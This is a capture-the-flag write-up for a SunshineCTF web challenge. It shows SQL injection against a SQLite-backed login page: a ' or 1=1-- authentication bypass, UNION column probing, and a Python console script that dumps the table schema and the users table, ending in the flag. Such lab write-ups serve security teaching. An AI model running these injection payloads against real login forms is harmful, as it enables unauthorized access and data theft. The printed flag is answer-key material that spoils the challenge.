# WrestlerBook
Web, 100 points

## Description

> WrestlerBook is the social network for wrestlers, by wrestlers. WrestlerBook is exclusively for wrestlers, so if you didn't get an invite don't even bother trying to view our profiles.


## Solution

We visit the attaches site and see a login page:

```html
<div class="login-form">
    <form action="login.php" method="post">
        <h2 class="text-center">Log in</h2>
        <div class="form-group">
            <input type="text" name="username" class="form-control" placeholder="Username" required="required">
        </div>
        <div class="form-group">
            <input type="password" name="password" class="form-control" placeholder="Password" required="required">
        </div>
        <div class="form-group">
            <button type="submit" class="btn btn-primary btn-block">Log in</button>
        </div>
        <div class="clearfix">
        </div>
    </form>
</div>
```

If we try to enter an apostrophe as the password, we get an SQL error:
```console
root@kali:/media/sf_CTFs/sunshine/WrestlerBook# curl http://archive.sunshinectf.org:19006/login.php -X POST --data "username=a&password='"
<br />
<b>Warning</b>:  SQLite3::query(): Unable to prepare statement: 1, unrecognized token: &quot;'''&quot; in <b>/var/www/html/login.php</b> on line <b>20</b><br />
<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetchArray() on boolean in /var/www/html/login.php:21
Stack trace:
#0 {main}
  thrown in <b>/var/www/html/login.php</b> on line <b>21</b><br />
```

This means that the site is vulnerable to SQL injection.

We can try to bypass the login test by using **`' or 1=1--`** as the password:
```console
root@kali:/media/sf_CTFs/sunshine/WrestlerBook# curl http://archive.sunshinectf.org:19006/login.php -X POST --data "username=a&password=' or 1=1--"
```

in response, we arrive to a page with details about a wrestler (Hulk Hogan):
```html
<div class="info">
    <div class="title">
        <a target="_blank"> Hulk Hogan </a>
    </div>
    <div class="desc">Username: hulkhogie</div>
    <div class="desc">Age: 65</div>
    <div class="desc">Title:  WWF World Heavyweight Champion</div>
    <div class="desc">Flag: N/A</div>
</div>
```

`SQLMap` can easily dump the database, but let's try doing in manually this time.

We know that the engine is SQLite from the original error message we saw. Let's try to create a UNION statement that will allow us to extract information from the DB.

SQLite has a `sqlite_master` table which holds information about the other tables. We can use it to extract table names and column names. However, first we have to arrive to a query which will have a legal syntax and let us extract the information we want.

We start with a simple union:

```console
root@kali:/media/sf_CTFs/sunshine/WrestlerBook# curl http://archive.sunshinectf.org:19006/login.php -X POST --data "username=a&password=a' UNION select 1 from sqlite_master--"
<br />
<b>Warning</b>:  SQLite3::query(): Unable to prepare statement: 1, SELECTs to the left and right of UNION do not have the same number of result columns in <b>/var/www/html/login.php</b> on line <b>20</b><br />
<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetchArray() on boolean in /var/www/html/login.php:21
Stack trace:
#0 {main}
  thrown in <b>/var/www/html/login.php</b> on line <b>21</b><br />
```

The error message we get tells us that the SELECTs on both sides of the UNION need to have the same amount of result columns. We increase the amount and try again until arriving to 8 column:

```console
root@kali:/media/sf_CTFs/sunshine/WrestlerBook# curl http://archive.sunshinectf.org:19006/login.php -X POST --data "username=a&password=a' UNION select 1,2,3,4,5,6,7,8 from s
qlite_master--"
...
                <div class="avatar">
                    <img alt="" src="3">
                </div>
                <div class="info">
                    <div class="title">
                        <a target="_blank"> 5 </a>
                    </div>
                    <div class="desc">Username: 1</div>
                    <div class="desc">Age: 4</div>
                    <div class="desc">Title: 6</div>
                    <div class="desc">Flag: 7</div>
                </div>
```

Now we are starting to see data from our query in the page result.

We can use the following Python script for easy trial & error:

```python
import re
import html
import requests
from cmd import Cmd


class MyPrompt(Cmd):
   def do_exit(self, inp):
        return True
 
   def do_send(self, param):
        q = "a' UNION {}--".format(param)
        r = requests.post('http://archive.sunshinectf.org:19006/login.php', data = {'username':"a", 'password': q})
        if "Fatal error" in r.text:
            print (r.text)
        else:
            m = re.search("<a target=\"_blank\">\s+(.+)\s+</a>", r.text)
            if m:
                print (html.unescape(m.group(1)))
            else:
                print(r.text)
 
MyPrompt().cmdloop()
```

This script lets us send queries in a mini-console, and extracts the output for easy viewing:

```console
(Cmd) send SELECT 1,2,3,4,name,6,7,8  FROM sqlite_master WHERE type='table' limit 0,1
sqlite_sequence
(Cmd) send SELECT 1,2,3,4,name,6,7,8  FROM sqlite_master WHERE type='table' limit 1,1
users
(Cmd) send SELECT 1,2,3,4,sql,6,7,8  FROM sqlite_master WHERE type='table' limit 0,1
CREATE TABLE `users` (
        `username`      TEXT,
        `password`      TEXT,
        `avatar`        TEXT,
        `age`   INTEGER,
        `name`  TEXT,
        `title` TEXT,
        `flag`  TEXT,
        `id`    INTEGER PRIMARY KEY AUTOINCREMENT
)
(Cmd) send SELECT 1,2,3,4,flag,6,7,8  FROM users WHERE length(flag) > 0 limit 0,1
N/A
(Cmd) send SELECT 1,2,3,4,flag,6,7,8  FROM users WHERE flag != "N/A" limit 0,1
example_flag
(Cmd) send SELECT 1,2,3,4,flag,6,7,8  FROM users WHERE flag != "N/A" limit 1,1
sun{ju57_4n07h3r_5ql1_ch4ll}
```